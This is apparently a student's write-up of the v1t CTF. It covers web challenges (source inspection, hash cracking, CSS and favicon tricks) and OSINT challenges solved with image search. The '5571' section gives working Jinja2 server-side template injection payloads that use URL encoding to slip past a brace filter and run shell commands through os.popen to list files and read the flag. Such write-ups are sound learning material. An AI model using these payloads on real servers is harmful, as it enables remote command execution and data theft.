# v1t CTF

## Lucky Flag
You don't have to search, it will randomly come to you :>

### Solve
**Flag:** `v1t{lucky_ducky}`

For this challenge, various tabs were searched in the website. In the source page, at the very end, the following code was given: 
let randomNumber = Math.floor(Math.random() * 1000);

if (randomNumber === 36) {  
    alert("Damnnn you got lucky :>");
  	alert(atob("djF0e2x1Y2t5X2R1Y2t5fQ=="));
}
The code generates a random number between 0 to 999 and if the number is 36, it shows two alerts. In the second alert there is an encrypted expression(Base 64). Decoding the expression using cyberchef gave the output as the flag.

### References 
None




# Web

## Login Panel
https://tommytheduck.github.io/login

### Solve
**Flag:** `v1t{p4ssw0rd}`

In the source page this code could seen, 
(async () => {
      const ajnsdjkamsf = 'ba773c013e5c07e8831bdb2f1cee06f349ea1da550ef4766f5e7f7ec842d836e'; // replace
      const lanfffiewnu = '48d2a5bbcf422ccd1b69e2a82fb90bafb52384953e77e304bef856084be052b6'; // replace

      const username = prompt('Enter username:');
      const password = prompt('Enter password:');

      if (username === null || password === null) {
        alert('Missing username or password');
        return;
      }

      const uHash = await sha256Hex(username);
      const pHash = await sha256Hex(password);

      if (timingSafeEqualHex(uHash, ajnsdjkamsf) && timingSafeEqualHex(pHash, lanfffiewnu)) {
        alert(username+ '{'+password+'}');
      } else {
        alert('Invalid credentials');
      }
    })();
In this we have to crack the sha 256 hash, for this I used the website "https://crackstation.net/". When "ba773c013e5c07e8831bdb2f1cee06f349ea1da550ef4766f5e7f7ec842d836e" was given as the input, it got decoded to "v1t" and when "48d2a5bbcf422ccd1b69e2a82fb90bafb52384953e77e304bef856084be052b6" was given as the input, it got decoded to "p4ssw0rd". Combining these two gave the flag.

### References 
None



## Stylish flag
Are you a front end dev ?

https://tommytheduck.github.io/stylish_flag/

### Solve
**Flag:** `v1t{H1D30UT_C55}`

After opening the website, I inspected it and in the sources tab, there was a csss.css file and in that the flag was seen to be pixel-art encoded using box-shadow. To decode that, the following code was used.

const flag = document.querySelector('.flag');
flag.hidden = false;
flag.style.opacity = '1';
flag.style.background = 'black';
flag.style.transform = 'none';
flag.style.position = 'absolute';
flag.style.top = '0';
flag.style.left = '0';
flag.style.zIndex = '9999';

what this code does is, first - Finds the first element on the page with the class flag and stores it in the variable flag. Then, removes the hidden attribute, sets the element’s opacity to full, gives the element a black background, cancels any CSS transformations (like rotation or scaling) that might distort or hide the flag, positions the element at the top-left corner of the page, detached from normal layout flow, brings the element to the front of all other content, ensuring it’s not obscured.

### New Learnings
javascript commands

### References 
online resources



## Tiny flag
Do you see the tiny flag :>

https://tommytheduck.github.io/tiny_flag

### Solve
**Flag:** `v1t{T1NY_IC0}`

<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

Upon opening the website, I searched everywhere for the flag, in the page source, inspect etc. turns out the flag was a favicon. Upon opening the source again, the above line was included in the code, and when the link favicon.ico was clicked we got the image when zoomed in gave the flag.

### New Learnings
->A favicon is a small icon, short for "favorite icon," that appears next to a website's title in a browser tab, in bookmarks, and in the address bar. 

### References 
None



## Mark The Lyrics
My friend make a website for his favourite, but the lyrics seem a little bit odd

http://tommytheduck.github.io/mckey

### Solve
**Flag:** `v1t{MCK-pap-cool-ooh-yeah}`

When the website was opened, the letters were in vietnamese. The first thing I did was to translate it into english. Google translate provided an option to translate the whole page. Then, it was seen that some letters/symbols were bold (darker in colour). Upon visiting the source, it was noticed that these letters/symbols were enclosed in <mark> </mark> as so, "<mark>V</mark>", then all these letters/symbols were combined to form the flag.

### New Learnings
The <mark> tag is an HTML element used to highlight text for relevance or importance

### References 
None



## 5571
My friend got highest mark with this challenge, can you beat it :>

http://chall.v1t.site:30300/

### Solve
**Flag:** `v1t{n0th1ng_b34ts_url_ssti_9cfac8e6b8978e3f6037d9608fed7767}`

This seemed like a server side template injection, so, I tried using "{{7*7}}", it gave an error as 
"Error: Input blocked: literal token '{' not allowed. Try encoding.
Try encoding blocked tokens"
So, I tried using different encoding techniques, the one that worked was URL encoding as when given "%7B%7B7*7%7D%7D" as the input gave 49 as the output. So, we need to exploit this to read our flag.
For that, I used this "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}" which I got from an online site which is used for the ls command. After url encoding it, I got "%7b%7b%73%65%6c%66%2e%5f%54%65%6d%70%6c%61%74%65%52%65%66%65%72%65%6e%63%65%5f%5f%63%6f%6e%74%65%78%74%2e%63%79%63%6c%65%72%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%6f%73%2e%70%6f%70%65%6e%28%27%6c%73%27%29%2e%72%65%61%64%28%29%7d%7d" 
It showed the following files:
Dockerfile
README.md
app.py
entrypoint.sh
flag.txt
requirements.txt
templates
Now, to cat our flag "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}" can be used. Therefore, the encoded payload is "%7b%7b%73%65%6c%66%2e%5f%54%65%6d%70%6c%61%74%65%52%65%66%65%72%65%6e%63%65%5f%5f%63%6f%6e%74%65%78%74%2e%63%79%63%6c%65%72%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%6f%73%2e%70%6f%70%65%6e%28%27%63%61%74%20%66%6c%61%67%2e%74%78%74%27%29%2e%72%65%61%64%28%29%7d%7d" which gave the output as the flag "v1t{n0th1ng_b34ts_url_ssti_9cfac8e6b8978e3f6037d9608fed7767}"

### References 
(https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)




# OSINT

## Among Usniversity
Bro, I found "Among Us" at this school!

Can you spot the hidden acronym?
Wrap it in v1t{...} to submit your answer.

Example: University of Economics Ho Chi Minh City => v1t{UEH}

### Solve
**Flag:** `v1t{UIT}`

In the image that they gave, The building is labeled “Trường Đại học Công nghệ Thông tin”, which translates to University of Information Technology in Vietnam, which lead us to our flag "UIT". The image was searched using google lens.

### References 
None


## Duck Company
I found this company selling this cute wooden duck for the halloween but i forgot where link web store :< can you help me find it

Flag format: v1t{example.com}

### Solve
**Flag:** `v1t{dcuk.com}`

I tried searching up the photo in google lens and the product was found to be DCUK Wizard Natural Wooden Duck Ornament. The official website to find this product is "dcuk.com" which is the flag.

### References 
None